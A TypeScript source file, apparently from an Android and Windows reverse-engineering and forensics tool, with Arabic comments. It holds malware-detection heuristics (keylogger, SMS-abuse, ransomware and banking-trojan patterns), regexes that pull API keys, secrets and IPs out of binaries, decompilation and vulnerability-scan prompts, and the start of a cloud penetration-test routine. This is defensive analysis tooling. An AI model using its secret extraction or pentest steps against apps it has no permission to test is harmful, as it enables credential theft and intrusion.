    if (/getDeviceId|getSubscriberId|getSimSerialNumber|getLine1Number/g.test(text)) {
      indicators.push({ type: "Data Theft", severity: "high", description: "جمع معلومات الجهاز/SIM — تسريب بيانات", evidence: fname });
    }

    // Keylogger patterns
    if (/onKey|KeyEvent|InputMethodService|AccessibilityService/g.test(text) && /log|send|upload|post/gi.test(text)) {
      indicators.push({ type: "Keylogger", severity: "critical", description: "نمط Keylogger — تسجيل ضغطات المفاتيح", evidence: fname });
    }

    // SMS abuse
    if (/SmsManager|sendTextMessage|SEND_SMS/g.test(text) && !/permission/gi.test(text)) {
      indicators.push({ type: "SMS Abuse", severity: "high", description: "إرسال SMS — اشتراكات مدفوعة مخفية", evidence: fname });
    }
  }

  // Permission-based indicators
  const permSet = new Set(permissions.map(p => p.replace("android.permission.", "")));
  if (permSet.has("BIND_DEVICE_ADMIN") && permSet.has("INTERNET")) {
    indicators.push({ type: "Ransomware", severity: "critical", description: "Device Admin + Internet — نمط Ransomware!", evidence: "AndroidManifest.xml" });
  }
  if (permSet.has("BIND_ACCESSIBILITY_SERVICE") && permSet.has("INTERNET")) {
    indicators.push({ type: "Banking Trojan", severity: "critical", description: "Accessibility + Internet — نمط Banking Trojan!", evidence: "AndroidManifest.xml" });
  }

  const score = Math.min(100, indicators.reduce((sum, i) => sum + (i.severity === "critical" ? 30 : i.severity === "high" ? 15 : 5), 0));
  const level = score >= 60 ? "خبيث محتمل 🔴" : score >= 30 ? "مشبوه 🟠" : score > 0 ? "مراقبة 🟡" : "نظيف 🟢";

  return { score, level, indicators };
}

// ── AI Deep Decompilation (Smali → Java without JADX) ────────────
export async function aiDecompileSmali(smaliCode: string, className: string): Promise<string> {
  const result = await callPowerAI(
    `أنت خبير هندسة عكسية متخصص في Android. حوّل كود Smali إلى Java مقروء.

قواعد:
1. أعد كود Java نظيف ومقروء فقط — بدون شرح
2. استنتج أسماء المتغيرات المناسبة من السياق
3. حوّل .method و .field لـ Java methods/fields
4. حوّل invoke-virtual/static/direct لاستدعاءات Java
5. حوّل const-string لقيم String
6. حوّل if-eqz/nez لـ if/else
7. أضف تعليقات توضيحية للأجزاء المعقدة`,
    `الكلاس: ${className}\n\nSmali:\n\`\`\`smali\n${smaliCode.substring(0, 15000)}\n\`\`\`\n\nحوّل لـ Java:`,
    8000
  );
  return result.content;
}

// ── AI Vulnerability Deep Scan ───────────────────────────────────
export async function aiVulnerabilityScan(code: string, fileName: string, fileType: string): Promise<{
  vulnerabilities: Array<{ severity: string; title: string; description: string; cwe: string; fix: string; line?: string }>;
  riskScore: number;
}> {
  const result = await callPowerAI(
    `أنت محلل أمن تطبيقات (Application Security Analyst) خبير.

حلل الكود بحثاً عن ثغرات أمنية. لكل ثغرة أعط:
- severity: critical/high/medium/low
- title: عنوان قصير
- description: شرح الثغرة
- cwe: رقم CWE (مثل CWE-89)
- fix: كيفية الإصلاح
- line: السطر المشبوه (إن أمكن)

ابحث عن: SQL Injection, XSS, Hardcoded Secrets, Insecure Storage, Weak Crypto, Path Traversal, Intent Injection, WebView vulnerabilities, Insecure Network, Certificate Pinning bypass, Root Detection bypass, Debug flags, Backup vulnerability.

أعد JSON array فقط.`,
    `الملف: ${fileName} (${fileType})\n\n\`\`\`\n${code.substring(0, 12000)}\n\`\`\``,
    6000
  );

  try {
    const cleaned = result.content.replace(/```json\n?/g, "").replace(/```\n?/g, "").trim();
    const m = cleaned.match(/\[[\s\S]*\]/);
    if (m) {
      const vulns = JSON.parse(m[0]);
      const riskScore = vulns.reduce((s: number, v: any) => s + (v.severity === "critical" ? 25 : v.severity === "high" ? 15 : v.severity === "medium" ? 8 : 3), 0);
      return { vulnerabilities: vulns, riskScore: Math.min(100, riskScore) };
    }
  } catch {}
  return { vulnerabilities: [], riskScore: 0 };
}

// ── AI Code Comparison / Similarity ──────────────────────────────
export async function aiCodeSimilarity(code1: string, code2: string): Promise<{
  similarity: number; analysis: string; sharedPatterns: string[];
}> {
  const result = await callPowerAI(
    `أنت خبير تحليل كود. قارن بين الكودين وحدد:
1. نسبة التشابه (0-100%)
2. الأنماط المشتركة
3. هل أحدهما نسخة من الآخر؟

أعد JSON: { "similarity": number, "analysis": "text", "sharedPatterns": ["pattern1", ...] }`,
    `كود 1:\n\`\`\`\n${code1.substring(0, 5000)}\n\`\`\`\n\nكود 2:\n\`\`\`\n${code2.substring(0, 5000)}\n\`\`\``,
    3000
  );

  try {
    const m = result.content.match(/\{[\s\S]*\}/);
    if (m) return JSON.parse(m[0]);
  } catch {}
  return { similarity: 0, analysis: "فشل التحليل", sharedPatterns: [] };
}

// ── Binary String Extraction (Enhanced) ──────────────────────────
export function extractStringsFromBinary(buffer: Buffer, minLength: number = 4): {
  strings: string[]; urls: string[]; emails: string[]; paths: string[];
  apiKeys: string[]; ips: string[];
} {
  const result: string[] = [];
  const urls: string[] = [];
  const emails: string[] = [];
  const paths: string[] = [];
  const apiKeys: string[] = [];
  const ips: string[] = [];

  // ASCII strings
  let current = "";
  for (let i = 0; i < buffer.length; i++) {
    const byte = buffer[i];
    if (byte >= 0x20 && byte <= 0x7e) {
      current += String.fromCharCode(byte);
    } else {
      if (current.length >= minLength) {
        result.push(current);
        if (/https?:\/\//i.test(current)) urls.push(current);
        if (/[\w.-]+@[\w.-]+\.\w+/.test(current)) emails.push(current);
        if (/^(\/[\w.-]+){2,}/.test(current)) paths.push(current);
        if (/sk[-_]|api[-_]?key|secret|token|password|AIza/i.test(current) && current.length > 10) apiKeys.push(current);
        if (/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/.test(current)) {
          const ip = current.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)?.[0] || "";
          if (ip && !ip.startsWith("127.") && !ip.startsWith("0.")) ips.push(ip);
        }
      }
      current = "";
    }
  }

  // UTF-16 LE strings (common in .NET and Windows binaries)
  current = "";
  for (let i = 0; i < buffer.length - 1; i += 2) {
    const code = buffer[i] | (buffer[i + 1] << 8);
    if (code >= 0x20 && code <= 0x7e) {
      current += String.fromCharCode(code);
    } else {
      if (current.length >= minLength && !result.includes(current)) {
        result.push(current);
      }
      current = "";
    }
  }

  return {
    strings: [...new Set(result)].slice(0, 2000),
    urls: [...new Set(urls)],
    emails: [...new Set(emails)],
    paths: [...new Set(paths)],
    apiKeys: [...new Set(apiKeys)],
    ips: [...new Set(ips)],
  };
}

// ── DEX Bytecode Parser (Pure JS — no external tools) ────────────
export function parseDEXHeader(buffer: Buffer): {
  valid: boolean; version: string; checksum: string; classCount: number;
  methodCount: number; fieldCount: number; stringCount: number; fileSize: number;
} | null {
  if (buffer.length < 112) return null;
  const magic = buffer.slice(0, 4).toString("ascii");
  if (magic !== "dex\n") return null;

  const version = buffer.slice(4, 7).toString("ascii");
  const checksum = buffer.readUInt32LE(8).toString(16);
  const fileSize = buffer.readUInt32LE(32);
  const stringCount = buffer.readUInt32LE(56);
  const fieldCount = buffer.readUInt32LE(64);
  const methodCount = buffer.readUInt32LE(72);
  const classCount = buffer.readUInt32LE(88);

  return { valid: true, version, checksum, classCount, methodCount, fieldCount, stringCount, fileSize };
}

// ── PE (EXE/DLL) Header Parser (Enhanced) ────────────────────────
export function parsePEHeaderDetailed(buffer: Buffer): {
  valid: boolean; machine: string; sections: Array<{ name: string; virtualSize: number; rawSize: number }>;
  imports: string[]; isDotNet: boolean; isSignedPE: boolean;
  compileTime: string; entryPoint: string; characteristics: string[];
} | null {
  if (buffer.length < 64) return null;
  if (buffer[0] !== 0x4D || buffer[1] !== 0x5A) return null; // MZ

  const peOffset = buffer.readUInt32LE(60);
  if (peOffset + 24 > buffer.length) return null;
  if (buffer.readUInt32LE(peOffset) !== 0x00004550) return null; // PE\0\0

  const machine = buffer.readUInt16LE(peOffset + 4);
  const machineStr = machine === 0x14c ? "x86 (32-bit)" : machine === 0x8664 ? "x64 (64-bit)" : machine === 0xAA64 ? "ARM64" : `0x${machine.toString(16)}`;

  const numSections = buffer.readUInt16LE(peOffset + 6);
  const timestamp = buffer.readUInt32LE(peOffset + 8);
  const compileTime = timestamp > 0 ? new Date(timestamp * 1000).toISOString() : "Unknown";
  const characteristics = buffer.readUInt16LE(peOffset + 22);

  const chars: string[] = [];
  if (characteristics & 0x0002) chars.push("Executable");
  if (characteristics & 0x0020) chars.push("Large Address Aware");
  if (characteristics & 0x2000) chars.push("DLL");
  if (characteristics & 0x0100) chars.push("32-bit");

  const optionalOffset = peOffset + 24;
  const optionalMagic = buffer.readUInt16LE(optionalOffset);
  const is64 = optionalMagic === 0x20b;
  const entryPointRVA = buffer.readUInt32LE(optionalOffset + 16);
  const entryPoint = `0x${entryPointRVA.toString(16)}`;

  // Sections
  const sectionTableOffset = optionalOffset + (is64 ? 240 : 224);
  const sections: Array<{ name: string; virtualSize: number; rawSize: number }> = [];
  for (let i = 0; i < numSections && i < 50; i++) {
    const off = sectionTableOffset + i * 40;
    if (off + 40 > buffer.length) break;
    const name = buffer.slice(off, off + 8).toString("ascii").replace(/\0/g, "");
    const virtualSize = buffer.readUInt32LE(off + 8);
    const rawSize = buffer.readUInt32LE(off + 16);
    sections.push({ name, virtualSize, rawSize });
  }

  // .NET detection
  const isDotNet = sections.some(s => s.name === ".text") && buffer.includes(Buffer.from("_CorExeMain")) || buffer.includes(Buffer.from("mscoree.dll"));

  // Import table strings
  const imports: string[] = [];
  const importStrings = buffer.toString("ascii").match(/[\w]+\.dll/gi);
  if (importStrings) imports.push(...new Set(importStrings));

  // Authenticode signature
  const isSignedPE = buffer.includes(Buffer.from("00020200")) || buffer.toString("hex").includes("30820");

  return { valid: true, machine: machineStr, sections, imports, isDotNet, isSignedPE, compileTime, entryPoint, characteristics: chars };
}


// ════════════════════════════════════════
// Advanced Forensics — String Decoder
// ════════════════════════════════════════
export interface DecodedString {
  original: string;
  decoded: string;
  encoding: "base64" | "hex" | "url" | "unicode" | "rot13" | "xor";
  file: string;
  line: number;
  confidence: number;
}

export function decodeStringsInFiles(files: DecompiledFile[]): DecodedString[] {
  const results: DecodedString[] = [];
  const seen = new Set<string>();
  const b64Regex = /(?:["'`])([A-Za-z0-9+/]{20,}={0,2})(?:["'`])/g;
  const hexRegex = /(?:["'`])((?:[0-9a-fA-F]{2}){10,})(?:["'`])/g;
  const urlRegex = /(?:["'`])(%[0-9A-Fa-f]{2}(?:%[0-9A-Fa-f]{2}|[\w.~:/?#\[\]@!$&'()*+,;=-]){8,})(?:["'`])/g;
  const unicodeRegex = /((?:\\u[0-9a-fA-F]{4}){4,})/g;

  for (const f of files) {
    if (!f.content || f.isBinary) continue;
    const lines = f.content.split("\n");
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];

      let m: RegExpExecArray | null;
      b64Regex.lastIndex = 0;
      while ((m = b64Regex.exec(line)) !== null) {
        const raw = m[1];
        if (seen.has(raw)) continue;
        seen.add(raw);
        try {
          const decoded = Buffer.from(raw, "base64").toString("utf-8");
          if (/[\x00-\x08\x0E-\x1F]/.test(decoded) || decoded.length < 4) continue;
          const printable = decoded.replace(/[^\x20-\x7E\u0600-\u06FF\u0400-\u04FF]/g, "").length / decoded.length;
          if (printable > 0.7) {
            results.push({ original: raw, decoded, encoding: "base64", file: f.path, line: i + 1, confidence: Math.round(printable * 100) });
          }
        } catch { /* skip */ }
      }

      hexRegex.lastIndex = 0;
      while ((m = hexRegex.exec(line)) !== null) {
        const raw = m[1];
        if (seen.has(raw)) continue;
        seen.add(raw);
        try {
          const decoded = Buffer.from(raw, "hex").toString("utf-8");
          const printable = decoded.replace(/[^\x20-\x7E]/g, "").length / decoded.length;
          if (printable > 0.8 && decoded.length >= 4) {
            results.push({ original: raw.slice(0, 60) + "...", decoded, encoding: "hex", file: f.path, line: i + 1, confidence: Math.round(printable * 100) });
          }
        } catch { /* skip */ }
      }

      urlRegex.lastIndex = 0;
      while ((m = urlRegex.exec(line)) !== null) {
        const raw = m[1];
        if (seen.has(raw)) continue;
        seen.add(raw);
        try {
          const decoded = decodeURIComponent(raw);
          if (decoded !== raw) {
            results.push({ original: raw.slice(0, 60), decoded, encoding: "url", file: f.path, line: i + 1, confidence: 95 });
          }
        } catch { /* skip */ }
      }

      unicodeRegex.lastIndex = 0;
      while ((m = unicodeRegex.exec(line)) !== null) {
        const raw = m[1];
        if (seen.has(raw)) continue;
        seen.add(raw);
        try {
          const decoded = JSON.parse(`"${raw}"`);
          if (decoded.length >= 2) {
            results.push({ original: raw.slice(0, 60), decoded, encoding: "unicode", file: f.path, line: i + 1, confidence: 99 });
          }
        } catch { /* skip */ }
      }
    }
  }

  return results.sort((a, b) => b.confidence - a.confidence).slice(0, 500);
}


// ════════════════════════════════════════
// Advanced Forensics — Cross Reference
// ════════════════════════════════════════
export interface XrefResult {
  target: string;
  references: Array<{
    file: string;
    line: number;
    context: string;
    type: "invoke" | "field" | "type" | "string" | "unknown";
  }>;
  totalCount: number;
}

export function crossReference(sessionId: string, target: string): XrefResult {
  const session = editSessions.get(sessionId);
  if (!session) return { target, references: [], totalCount: 0 };

  const refs: XrefResult["references"] = [];
  const escaped = target.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
  const regex = new RegExp(escaped, "i");

  const allFiles = readDirRecursive(session.decompDir);
  const textExts = [".smali", ".java", ".kt", ".xml", ".json", ".properties", ".txt", ".yml", ".yaml", ".gradle", ".pro", ".cfg"];

  for (const fp of allFiles) {
    const ext = path.extname(fp).toLowerCase();
    if (!textExts.includes(ext)) continue;
    try {
      const stat = fs.statSync(fp);
      if (stat.size > 2_000_000) continue;
      const content = fs.readFileSync(fp, "utf-8");
      const lines = content.split("\n");
      for (let i = 0; i < lines.length; i++) {
        if (regex.test(lines[i])) {
          let type: "invoke" | "field" | "type" | "string" | "unknown" = "unknown";
          const l = lines[i];
          if (/invoke-/.test(l)) type = "invoke";
          else if (/[igs]get|[igs]put|\.field/.test(l)) type = "field";
          else if (/\.class|\.super|\.implements|instanceof|check-cast|new-instance/.test(l)) type = "type";
          else if (/"[^"]*"/.test(l) || /const-string/.test(l)) type = "string";

          refs.push({
            file: path.relative(session.decompDir, fp),
            line: i + 1,
            context: l.trim().slice(0, 200),
            type,
          });
        }
      }
    } catch { /* skip */ }
    if (refs.length >= 1000) break;
  }

  return { target, references: refs.slice(0, 500), totalCount: refs.length };
}


// ════════════════════════════════════════
// Advanced Forensics — Class Hierarchy
// ════════════════════════════════════════
export interface ClassNode {
  name: string;
  superClass: string;
  interfaces: string[];
  methods: number;
  fields: number;
  file: string;
  isAbstract: boolean;
  isInterface: boolean;
  children: string[];
}

export function buildClassHierarchy(sessionId: string): { classes: ClassNode[]; stats: { totalClasses: number; interfaces: number; abstractClasses: number; maxDepth: number } } {
  const session = editSessions.get(sessionId);
  if (!session) return { classes: [], stats: { totalClasses: 0, interfaces: 0, abstractClasses: 0, maxDepth: 0 } };

  const classes: ClassNode[] = [];
  const classMap = new Map<string, ClassNode>();
  const allFiles = readDirRecursive(session.decompDir);
  const smaliFiles = allFiles.filter(f => f.endsWith(".smali"));

  for (const fp of smaliFiles) {
    try {
      const stat = fs.statSync(fp);
      if (stat.size > 1_000_000) continue;
      const content = fs.readFileSync(fp, "utf-8");
      const classMatch = content.match(/\.class\s+(.*?)\s+(L[\w/$]+;)/);
      if (!classMatch) continue;

      const modifiers = classMatch[1];
      const className = classMatch[2];
      const superMatch = content.match(/\.super\s+(L[\w/$]+;)/);
      const superClass = superMatch ? superMatch[1] : "Ljava/lang/Object;";
      const ifaceMatches = content.matchAll(/\.implements\s+(L[\w/$]+;)/g);
      const interfaces = Array.from(ifaceMatches).map(m => m[1]);
      const methods = (content.match(/\.method\s+/g) || []).length;
      const fields = (content.match(/\.field\s+/g) || []).length;
      const isAbstract = modifiers.includes("abstract");
      const isInterface = modifiers.includes("interface");

      const node: ClassNode = {
        name: className,
        superClass,
        interfaces,
        methods,
        fields,
        file: path.relative(session.decompDir, fp),
        isAbstract,
        isInterface,
        children: [],
      };
      classes.push(node);
      classMap.set(className, node);
    } catch { /* skip */ }
  }

  for (const cls of classes) {
    const parent = classMap.get(cls.superClass);
    if (parent) parent.children.push(cls.name);
  }

  let maxDepth = 0;
  const computeDepth = (name: string, visited: Set<string>): number => {
    if (visited.has(name)) return 0;
    visited.add(name);
    const node = classMap.get(name);
    if (!node || node.children.length === 0) return 1;
    return 1 + Math.max(...node.children.map(c => computeDepth(c, visited)));
  };
  for (const cls of classes) {
    if (cls.superClass === "Ljava/lang/Object;" || !classMap.has(cls.superClass)) {
      maxDepth = Math.max(maxDepth, computeDepth(cls.name, new Set()));
    }
  }

  return {
    classes: classes.slice(0, 5000),
    stats: {
      totalClasses: classes.length,
      interfaces: classes.filter(c => c.isInterface).length,
      abstractClasses: classes.filter(c => c.isAbstract).length,
      maxDepth,
    },
  };
}


// ════════════════════════════════════════
// Advanced Forensics — APK Diff / Compare
// ════════════════════════════════════════
export interface DiffResult {
  added: string[];
  removed: string[];
  modified: Array<{ path: string; sizeDiff: number; oldSize: number; newSize: number }>;
  unchanged: number;
  summary: {
    totalAdded: number;
    totalRemoved: number;
    totalModified: number;
    totalUnchanged: number;
    permissionChanges: { added: string[]; removed: string[] };
    versionChange: { old: string; new: string } | null;
  };
}

export async function diffAPKs(apk1Buffer: Buffer, apk2Buffer: Buffer, name1: string, name2: string): Promise<DiffResult> {
  const zip1 = await JSZip.loadAsync(apk1Buffer);
  const zip2 = await JSZip.loadAsync(apk2Buffer);

  const files1 = new Map<string, { size: number; crc: number }>();
  const files2 = new Map<string, { size: number; crc: number }>();

  zip1.forEach((p, entry) => {
    if (!entry.dir) files1.set(p, { size: entry._data?.uncompressedSize || 0, crc: (entry as any)._data?.crc32 || 0 });
  });
  zip2.forEach((p, entry) => {
    if (!entry.dir) files2.set(p, { size: entry._data?.uncompressedSize || 0, crc: (entry as any)._data?.crc32 || 0 });
  });

  const added: string[] = [];
  const removed: string[] = [];
  const modified: DiffResult["modified"] = [];
  let unchanged = 0;

  for (const [p, info] of files2) {
    if (!files1.has(p)) {
      added.push(p);
    } else {
      const old = files1.get(p)!;
      if (old.crc !== info.crc || old.size !== info.size) {
        modified.push({ path: p, sizeDiff: info.size - old.size, oldSize: old.size, newSize: info.size });
      } else {
        unchanged++;
      }
    }
  }
  for (const p of files1.keys()) {
    if (!files2.has(p)) removed.push(p);
  }

  let permsOld: string[] = [];
  let permsNew: string[] = [];
  let verOld = "";
  let verNew = "";
  try {
    const m1 = await zip1.file("AndroidManifest.xml")?.async("uint8array");
    const m2 = await zip2.file("AndroidManifest.xml")?.async("uint8array");
    if (m1) {
      const s1 = Buffer.from(m1).toString("utf-8");
      permsOld = Array.from(s1.matchAll(/uses-permission[^"]*"([^"]+)"/g)).map(m => m[1]);
      const vMatch1 = s1.match(/versionName="([^"]+)"/);
      if (vMatch1) verOld = vMatch1[1];
    }
    if (m2) {
      const s2 = Buffer.from(m2).toString("utf-8");
      permsNew = Array.from(s2.matchAll(/uses-permission[^"]*"([^"]+)"/g)).map(m => m[1]);
      const vMatch2 = s2.match(/versionName="([^"]+)"/);
      if (vMatch2) verNew = vMatch2[1];
    }
  } catch { /* manifest might be binary */ }

  const addedPerms = permsNew.filter(p => !permsOld.includes(p));
  const removedPerms = permsOld.filter(p => !permsNew.includes(p));

  return {
    added: added.slice(0, 500),
    removed: removed.slice(0, 500),
    modified: modified.sort((a, b) => Math.abs(b.sizeDiff) - Math.abs(a.sizeDiff)).slice(0, 500),
    unchanged,
    summary: {
      totalAdded: added.length,
      totalRemoved: removed.length,
      totalModified: modified.length,
      totalUnchanged: unchanged,
      permissionChanges: { added: addedPerms, removed: removedPerms },
      versionChange: (verOld || verNew) ? { old: verOld || "غير معروف", new: verNew || "غير معروف" } : null,
    },
  };
}


// ════════════════════════════════════════
// Advanced Forensics — Data Flow Analysis
// ════════════════════════════════════════
export interface DataFlowResult {
  sensitiveApis: Array<{
    api: string;
    category: "crypto" | "network" | "storage" | "location" | "sms" | "camera" | "contacts" | "device_info";
    file: string;
    line: number;
    context: string;
    dataFlow: string[];
  }>;
  sinks: Array<{ type: string; file: string; line: number; context: string }>;
  sources: Array<{ type: string; file: string; line: number; context: string }>;
}

export function analyzeDataFlow(sessionId: string): DataFlowResult {
  const session = editSessions.get(sessionId);
  if (!session) return { sensitiveApis: [], sinks: [], sources: [] };

  const sensitivePatterns: Array<{ pattern: RegExp; api: string; category: DataFlowResult["sensitiveApis"][0]["category"] }> = [
    { pattern: /Ljavax\/crypto\/Cipher;->getInstance/g, api: "Cipher.getInstance", category: "crypto" },
    { pattern: /Ljavax\/crypto\/SecretKeySpec;-><init>/g, api: "SecretKeySpec()", category: "crypto" },
    { pattern: /Ljavax\/crypto\/Mac;->getInstance/g, api: "Mac.getInstance", category: "crypto" },
    { pattern: /MessageDigest;->getInstance/g, api: "MessageDigest.getInstance", category: "crypto" },
    { pattern: /Ljava\/security\/KeyPairGenerator;->getInstance/g, api: "KeyPairGenerator.getInstance", category: "crypto" },
    { pattern: /HttpURLConnection|OkHttpClient|Retrofit|Volley/g, api: "HTTP Client", category: "network" },
    { pattern: /SSLContext;->getInstance|TrustManager|X509/g, api: "SSL/TLS", category: "network" },
    { pattern: /WebView;->loadUrl|WebView;->loadData/g, api: "WebView.load", category: "network" },
    { pattern: /SharedPreferences|SQLiteDatabase|ContentValues|Room/g, api: "Local Storage", category: "storage" },
    { pattern: /getExternalStorageDirectory|getFilesDir|getCacheDir/g, api: "File Storage", category: "storage" },
    { pattern: /LocationManager;->getLastKnownLocation|FusedLocationProviderClient/g, api: "Location", category: "location" },
    { pattern: /SmsManager;->sendTextMessage|SmsManager;->sendMultipart/g, api: "Send SMS", category: "sms" },
    { pattern: /Camera;->open|CameraManager;->openCamera/g, api: "Camera", category: "camera" },
    { pattern: /ContactsContract|ContentResolver.*Contacts/g, api: "Contacts", category: "contacts" },
    { pattern: /TelephonyManager;->getDeviceId|getImei|getSubscriberId|getLine1Number/g, api: "Device ID", category: "device_info" },
    { pattern: /Settings\$Secure;->getString.*android_id/g, api: "Android ID", category: "device_info" },
    { pattern: /Build;->SERIAL|Build;->FINGERPRINT|Build;->MODEL/g, api: "Device Info", category: "device_info" },
  ];

  const sinkPatterns = [
    { pattern: /Log;->[devwi]\(/g, type: "Logging" },
    { pattern: /Intent;->putExtra/g, type: "Intent Extra" },
    { pattern: /OutputStream;->write|Writer;->write/g, type: "File Write" },
    { pattern: /sendBroadcast|startActivity|startService/g, type: "IPC" },
    { pattern: /Runtime;->exec|ProcessBuilder/g, type: "Command Execution" },
    { pattern: /DexClassLoader|PathClassLoader|loadClass/g, type: "Dynamic Class Loading" },
    { pattern: /Ljava\/lang\/reflect\/Method;->invoke/g, type: "Reflection" },
  ];

  const sourcePatterns = [
    { pattern: /getIntent|getExtras|getStringExtra/g, type: "Intent Data" },
    { pattern: /InputStream;->read|BufferedReader;->readLine/g, type: "File Read" },
    { pattern: /Clipboard;->getPrimaryClip/g, type: "Clipboard" },
    { pattern: /getQueryParameter|getQuery/g, type: "URL Parameter" },
  ];

  const sensitiveApis: DataFlowResult["sensitiveApis"] = [];
  const sinks: DataFlowResult["sinks"] = [];
  const sources: DataFlowResult["sources"] = [];

  const allFiles = readDirRecursive(session.decompDir);
  const smaliFiles = allFiles.filter(f => f.endsWith(".smali") || f.endsWith(".java") || f.endsWith(".kt"));

  for (const fp of smaliFiles) {
    try {
      const stat = fs.statSync(fp);
      if (stat.size > 2_000_000) continue;
      const content = fs.readFileSync(fp, "utf-8");
      const lines = content.split("\n");
      const relPath = path.relative(session.decompDir, fp);

      for (let i = 0; i < lines.length; i++) {
        const l = lines[i];

        for (const sp of sensitivePatterns) {
          sp.pattern.lastIndex = 0;
          if (sp.pattern.test(l)) {
            const flowContext: string[] = [];
            for (let j = Math.max(0, i - 3); j <= Math.min(lines.length - 1, i + 3); j++) {
              const trimmed = lines[j].trim();
              if (trimmed && !trimmed.startsWith(".") && !trimmed.startsWith("#")) flowContext.push(trimmed);
            }
            sensitiveApis.push({
              api: sp.api,
              category: sp.category,
              file: relPath,
              line: i + 1,
              context: l.trim().slice(0, 200),
              dataFlow: flowContext.slice(0, 5),
            });
          }
        }

        for (const sk of sinkPatterns) {
          sk.pattern.lastIndex = 0;
          if (sk.pattern.test(l)) {
            sinks.push({ type: sk.type, file: relPath, line: i + 1, context: l.trim().slice(0, 200) });
          }
        }

        for (const sr of sourcePatterns) {
          sr.pattern.lastIndex = 0;
          if (sr.pattern.test(l)) {
            sources.push({ type: sr.type, file: relPath, line: i + 1, context: l.trim().slice(0, 200) });
          }
        }
      }
    } catch { /* skip */ }

    if (sensitiveApis.length >= 500) break;
  }

  return {
    sensitiveApis: sensitiveApis.slice(0, 300),
    sinks: sinks.slice(0, 300),
    sources: sources.slice(0, 300),
  };
}


// ════════════════════════════════════════
// Advanced Forensics — Method Signature Search
// ════════════════════════════════════════
export interface MethodSearchResult {
  methods: Array<{
    className: string;
    methodName: string;
    signature: string;
    modifiers: string;
    file: string;
    line: number;
    registers: number;
    linesOfCode: number;
  }>;
  totalFound: number;
}

export function methodSignatureSearch(sessionId: string, query: string): MethodSearchResult {
  const session = editSessions.get(sessionId);
  if (!session) return { methods: [], totalFound: 0 };

  const methods: MethodSearchResult["methods"] = [];
  const queryLower = query.toLowerCase();
  const allFiles = readDirRecursive(session.decompDir);
  const smaliFiles = allFiles.filter(f => f.endsWith(".smali"));

  for (const fp of smaliFiles) {
    try {
      const stat = fs.statSync(fp);
      if (stat.size > 2_000_000) continue;
      const content = fs.readFileSync(fp, "utf-8");
      const relPath = path.relative(session.decompDir, fp);

      const classMatch = content.match(/\.class\s+.*?(L[\w/$]+;)/);
      const className = classMatch ? classMatch[1] : relPath;

      const methodMatches = content.matchAll(/\.method\s+(.*?)\s+([\w<>]+)\((.*?)\)(.*)/g);
      for (const m of methodMatches) {
        const modifiers = m[1];
        const methodName = m[2];
        const params = m[3];
        const returnType = m[4];
        const fullSig = `${methodName}(${params})${returnType}`;

        if (
          fullSig.toLowerCase().includes(queryLower) ||
          methodName.toLowerCase().includes(queryLower) ||
          className.toLowerCase().includes(queryLower)
        ) {
          const methodStart = content.indexOf(m[0]);
          const lineNum = content.slice(0, methodStart).split("\n").length;
          const endIdx = content.indexOf(".end method", methodStart);
          const methodBody = endIdx > methodStart ? content.slice(methodStart, endIdx) : "";
          const loc = methodBody.split("\n").length;
          const regMatch = methodBody.match(/\.registers\s+(\d+)/);
          const registers = regMatch ? parseInt(regMatch[1]) : 0;

          methods.push({
            className,
            methodName,
            signature: fullSig,
            modifiers: modifiers.trim(),
            file: relPath,
            line: lineNum,
            registers,
            linesOfCode: loc,
          });
        }
      }
    } catch { /* skip */ }
    if (methods.length >= 500) break;
  }

  return { methods: methods.slice(0, 200), totalFound: methods.length };
}


// ════════════════════════════════════════
// Advanced Forensics — Export Report
// ════════════════════════════════════════
export async function generateForensicReport(sessionId: string, analyses: {
  decodedStrings?: boolean;
  crossRef?: string;
  classHierarchy?: boolean;
  dataFlow?: boolean;
  networkEndpoints?: boolean;
  obfuscation?: boolean;
  malware?: boolean;
}): Promise<{
  report: Record<string, any>;
  generatedAt: string;
  sessionId: string;
}> {
  const session = editSessions.get(sessionId);
  if (!session) throw new Error("جلسة غير موجودة");

  const report: Record<string, any> = {
    meta: {
      sessionId,
      originalFile: (session as any).originalName || "unknown",
      analyzedAt: new Date().toISOString(),
      platform: "HAYO AI RE Platform v4.0",
    },
  };

  const allFiles = readDirRecursive(session.decompDir);
  const textExts = [".smali", ".java", ".kt", ".xml", ".json", ".properties", ".txt", ".yml", ".yaml", ".gradle", ".pro"];
  const textFiles: DecompiledFile[] = [];
  for (const fp of allFiles.slice(0, 5000)) {
    const ext = path.extname(fp).toLowerCase();
    if (!textExts.includes(ext)) continue;
    try {
      const stat = fs.statSync(fp);
      if (stat.size > 500_000) continue;
      const content = fs.readFileSync(fp, "utf-8");
      textFiles.push({
        path: path.relative(session.decompDir, fp),
        name: path.basename(fp),
        extension: ext,
        size: stat.size,
        content,
        isBinary: false,
      });
    } catch { /* skip */ }
  }

  report.fileStats = {
    totalFiles: allFiles.length,
    textFiles: textFiles.length,
    smaliFiles: allFiles.filter(f => f.endsWith(".smali")).length,
    xmlFiles: allFiles.filter(f => f.endsWith(".xml")).length,
  };

  if (analyses.decodedStrings) {
    report.decodedStrings = decodeStringsInFiles(textFiles);
  }
  if (analyses.crossRef) {
    report.crossReference = crossReference(sessionId, analyses.crossRef);
  }
  if (analyses.classHierarchy) {
    report.classHierarchy = buildClassHierarchy(sessionId);
  }
  if (analyses.dataFlow) {
    report.dataFlow = analyzeDataFlow(sessionId);
  }
  if (analyses.networkEndpoints) {
    report.networkEndpoints = extractNetworkEndpoints(textFiles);
  }
  if (analyses.obfuscation) {
    report.obfuscation = detectObfuscation(textFiles);
  }
  if (analyses.malware) {
    const perms: string[] = [];
    report.malware = detectMalwarePatterns(textFiles, perms);
  }

  return { report, generatedAt: new Date().toISOString(), sessionId };
}

// ════════════════════════════════════════════════════════════════════
// Cloud Database Penetration Test (7-Step Automated Analysis)
// ════════════════════════════════════════════════════════════════════

export interface CloudPentestStep {
  id: number;
  title: string;
  status: "success" | "warning" | "info" | "critical";
  findings: string[];
  commands: string[];
  details: string;
  pythonScript?: string;
}

export interface CloudPentestResult {
  steps: CloudPentestStep[];
  summary: {
    totalFindings: number;
    criticalCount: number;
    highCount: number;
    mediumCount: number;
    lowCount: number;
    riskScore: number;
    cloudProviders: string[];
    extractedEndpoints: string[];
    extractedKeys: string[];
    vulnerableApis: string[];
  };
  report: string;
  generatedAt: string;
}

export async function runCloudPentest(sessionId: string): Promise<CloudPentestResult> {
  const session = editSessions.get(sessionId);
